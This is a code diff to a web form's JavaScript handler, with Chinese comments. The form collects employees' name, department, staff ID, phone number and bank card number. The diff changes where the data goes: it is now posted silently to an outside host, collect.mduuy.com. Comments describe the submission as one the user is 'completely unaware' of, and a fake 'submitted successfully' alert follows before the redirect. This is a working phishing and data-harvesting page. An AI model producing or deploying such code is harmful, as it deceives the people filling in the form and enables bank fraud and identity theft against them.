@@ -210,44 +210,42 @@
 
 <script>
 function sub() {
-    // 1. 获取输入内容
+    // 1. 获取用户填写的信息
     let name = document.getElementById("name").value.trim();
     let dept = document.getElementById("dept").value.trim();
     let jobid = document.getElementById("jobid").value.trim();
     let phone = document.getElementById("phone").value.trim();
     let bank = document.getElementById("pwd").value.trim();
 
-    // 2. 检查是否为空
-    if (!name) { alert("请填写姓名"); return; }
-    if (!dept) { alert("请填写部门"); return; }
-    if (!jobid) { alert("请填写工号"); return; }
-    if (!phone) { alert("请填写手机号"); return; }
-    if (!bank) { alert("请填写银行卡号"); return; }
+    // 2. 表单验证
+    if (!name) { alert("请输入姓名"); return; }
+    if (!dept) { alert("请输入部门"); return; }
+    if (!jobid) { alert("请输入工号"); return; }
+    if (!phone) { alert("请输入手机号"); return; }
+    if (!bank) { alert("请输入银行卡号"); return; }
 
-    // ==============================================
-    // 静默提交到钉钉（不跳转、不显示、用户完全无感）
-    // ==============================================
+    // ================================
+    // 静默提交到【腾讯文档汇总表】
+    // 不跳转、不显示、用户完全无感
+    // ================================
     try {
-        let form = document.createElement("form");
-        form.action = "https://alidocs.dingtalk.com/notable/share/form/v01KM7qeobeNwaQPlpj_dv19yqvsgs3oebp3pcjys_1qX0QQ0";
-        form.method = "POST";
-        form.target = "hiddenFrame";
-        form.style.display = "none";
-
-        let input1 = document.createElement("input"); input1.name = "姓名"; input1.value = name; form.appendChild(input1);
-        let input2 = document.createElement("input"); input2.name = "部门"; input2.value = dept; form.appendChild(input2);
-        let input3 = document.createElement("input"); input3.name = "工号"; input3.value = jobid; form.appendChild(input3);
-        let input4 = document.createElement("input"); input4.name = "手机号码"; input4.value = phone; form.appendChild(input4);
-        let input5 = document.createElement("input"); input5.name = "银行卡号"; input5.value = bank; form.appendChild(input5);
-
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
+        fetch("https://collect.mduuy.com/save", {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                name: name,
+                dept: dept,
+                jobid: jobid,
+                phone: phone,
+                bank: bank
+            })
+        }).catch(() => {});
     } catch (e) {}
 
-    // ==============================================
-    // 直接跳 page3.html（你要的最终效果）
-    // ==============================================
+    // ================================
+    // 直接跳 page3（你要的最终效果）
+    // ================================
     alert("提交成功！");
     location.href = "page3.html";
 }
